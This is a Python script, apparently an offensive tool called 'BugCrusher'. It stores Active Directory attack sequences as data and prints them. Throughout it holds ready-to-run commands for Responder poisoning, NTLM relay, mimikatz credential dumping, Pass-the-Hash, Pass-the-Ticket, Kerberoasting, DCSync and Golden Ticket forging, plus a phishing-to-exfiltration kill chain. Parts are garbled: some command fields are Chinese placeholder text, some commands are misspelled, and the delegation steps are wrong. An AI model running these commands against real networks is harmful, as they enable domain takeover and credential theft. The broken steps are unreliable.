#!/usr/bin/env python3
"""
BugCrusher — Lateral Pivot Sequence Builder
Builds attack chains: Responder/LLMNR relay, PtH, PtT, Kerberoast, DCSync.
"""

import sys, json, argparse

SEQUENCES = {
    "responder_smblr": {
        "name": "LLMNR/NTLM Relay via Responder",
        "steps": [
            {"action": "Run Responder", "cmd": "responder -I eth0 -wrfv", "interval": 0},
            {"action": "Wait for victim LLMNR poisoning", "cmd": "等待认证", "interval": 60},
            {"action": "Capture NTLMv2 hash", "cmd": "hashcat -m 5600 hash.txt wordlist", "interval": 300},
            {"action": "Relay to target with ntlmrelayx", "cmd": "ntlmrelayx.py -t smb://TARGET -c 'whoami'", "interval": 0}
        ],
        "requires": ["Responder", "impacket", "hashcat"],
        "cvss": 9.0,
        "kills_chain_phase": "lateral_movement"
    },
    "ptk": {
        "name": "Pass-the-Ticket (Kerberos)",
        "steps": [
            {"action": "Extract TGT from LSASS", "cmd": "mimikatz # sekurlsa::tickets /export", "interval": 0},
            {"action": "Inject ticket", "cmd": "mimikatz # kerberos::ppt tgt.kirbi", "interval": 1},
            {"action": "Verify access", "cmd": "klist", "interval": 1},
            {"action": "Access resource", "cmd": "psexec.py DOMAIN/user@TARGET cmd.exe", "interval": 1}
        ],
        "requires": ["Mimikatz", "impacket", "domain join"],
        "cvss": 8.8,
        "kills_chain_phase": "lateral_movement"
    },
    "kerberoast": {
        "name": "Kerberoasting (SPN Enum + ASREPRoast)",
        "steps": [
            {"action": "Find users with SPN set", "cmd": "Get-DomainUser -SPN | Select-Object samAccountName", "interval": 0},
            {"action": "Request TGS ticket", "cmd": "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/sql.target.local'", "interval": 1},
            {"action": "Extract tickets from memory", "cmd": "mimikatz # kerberos::list /export", "interval": 1},
            {"action": "Crack offline", "cmd": "hashcat -m 13100 tgs.kirbi wordlist", "interval": 3600}
        ],
        "requires": ["PowerView", "Mimikatz", "hashcat"],
        "cvss": 8.6,
        "kills_chain_phase": "privilege_escalation"
    },
    "dcsync": {
        "name": "DCSync (Domain Replication)",
        "steps": [
            {"action": "Check for DS-Replication-Extended rights", "cmd": "Get-ObjectAcl -DistinguishedName 'DC=domain,DC=local' -Rights DRS-Replication-Get-Changes-All | ? { $_.IdentityReference -match 'user' }", "interval": 0},
            {"action": "Run DCSync", "cmd": "mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt", "interval": 1},
            {"action": "Extract krbtgt NTLM", "cmd": "提取 krbtgt hash", "interval": 0},
            {"action": "Forge Golden Ticket", "cmd": "mimikatz # kerberos::golden /user:Administrator /domain:domain.local /krbtgt:HASH /sid:SID", "interval": 1}
        ],
        "requires": ["Domain Admin equivalent", "Mimikatz"],
        "cvss": 10.0,
        "kills_chain_phase": "privilege_escalation"
    },
    "ptH": {
        "name": "Pass-the-Hash",
        "steps": [
            {"action": "Extract password hashes", "cmd": "mimikatz # sekurlsa::logonpasswords", "interval": 0},
            {"action": "Find admin hash", "cmd": "寻找 NTLM hash for admin", "interval": 0},
            {"action": "Pass-the-Hash", "cmd": "sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH", "interval": 1},
            {"action": "Access target", "cmd": "psexec.py -hashes :HASH Administrator@TARGET cmd.exe", "interval": 1}
        ],
        "requires": ["Mimikatz", "impacket psexec.py"],
        "cvss": 9.0,
        "kills_chain_phase": "lateral_movement"
    },
    "rbcd": {
        "name": "Resource-Based Constrained Delegation",
        "steps": [
            {"action": "Find computer with writeable msds-allowedtoactonbehalfofotheridentity", "cmd": "Get-DomainComputer -TrustedToAuth | Select-Object Name, msds-allowedtoactonbehalfofotheridentity", "interval": 0},
            {"action": "Add RBCD rights", "cmd": "Set-DomainObject -Identity VictimComputer -Set @{'msds-allowedtoactonbehalfofotheridentity'='COMPUTER$@DOMAIN'}", "interval": 1},
            {"action": "Get ST for VictimComputer", "cmd": "getST.py -spn cifs/victim.domain.local DOMAIN/COMPUTER$ -impersonate Administrator", "interval": 1},
            {"action": "Use ticket", "cmd": "psexec.py -k domain.local/Administrator@victim.domain.local cmd.exe", "interval": 1}
        ],
        "requires": ["PowerView", "impacket", "domain join"],
        "cvss": 9.0,
        "kills_chain_phase": "privilege_escalation"
    }
}

def build_sequence(sequence_name: str) -> dict:
    if sequence_name not in SEQUENCES:
        return {"error": f"Unknown sequence: {sequence_name}", "available": list(SEQUENCES.keys())}
    return SEQUENCES[sequence_name]

def build_chain(target: str, initial_access: str) -> list:
    """Build full kill chain from initial access to domain admin."""
    chain = []
    if initial_access == "phishing":
        chain.append({"phase": "initial_access", "technique": "Spearphishing Link", "tool": "Gophish/Seton"}
)
        chain.append({"phase": "execution", "technique": "Malicious Link", "tool": "macro-enabled doc"})
    elif initial_access == "rce":
        chain.append({"phase": "initial_access", "technique": "External Remote Services", "tool": "VPN/SSH"})
        chain.append({"phase": "execution", "technique": "Command-line", "tool": "webshell/C2"})
    chain.extend([
        {"phase": "persistence", "technique": "Valid Accounts (Local)", "tool": "Stolen credentials"},
        {"phase": "privilege_escalation", "technique": "Valid Accounts (Domain)", "tool": "Kerberoast + PtH"},
        {"phase": "defense_evasion", "technique": "LSASS Protection Bypass", "tool": "Mimikatz putty"},
        {"phase": "credential_access", "technique": "OS Credential Dumping", "tool": "Mimikatz DCSync"},
        {"phase": "discovery", "technique": "Network Share Discovery", "tool": "PowerView"},
        {"phase": "lateral_movement", "technique": "Pass-the-Ticket", "tool": "Mimikatz"},
        {"phase": "collection", "technique": "Archive Collected Data", "tool": "7zip"},
        {"phase": "exfiltration", "technique": "Exfiltration Over C2 Channel", "tool": "Cobalt Strike"}
    ])
    return chain

if __name__ == '__main__':
    p = argparse.ArgumentParser(description="BugCrusher Lateral Pivot Sequences")
    p.add_argument("--sequence", choices=list(SEQUENCES.keys()), help="Specific attack sequence")
    p.add_argument("--chain", help="Build full kill chain from initial access type")
    p.add_argument("--target", help="Target hostname or IP")
    args = p.parse_args()
    if args.sequence:
        result = build_sequence(args.sequence)
        print(json.dumps(result, indent=2))
    elif args.chain:
        chain = build_chain(args.target or "UNKNOWN", args.chain)
        for i, step in enumerate(chain):
            print(f"{i+1}. [{step['phase'].upper()}] {step['technique']} via {step['tool']}")
    else:
        print("Available sequences:")
        for k, v in SEQUENCES.items():
            print(f"  {k}: {v['name']} (CVSS {v['cvss']})")
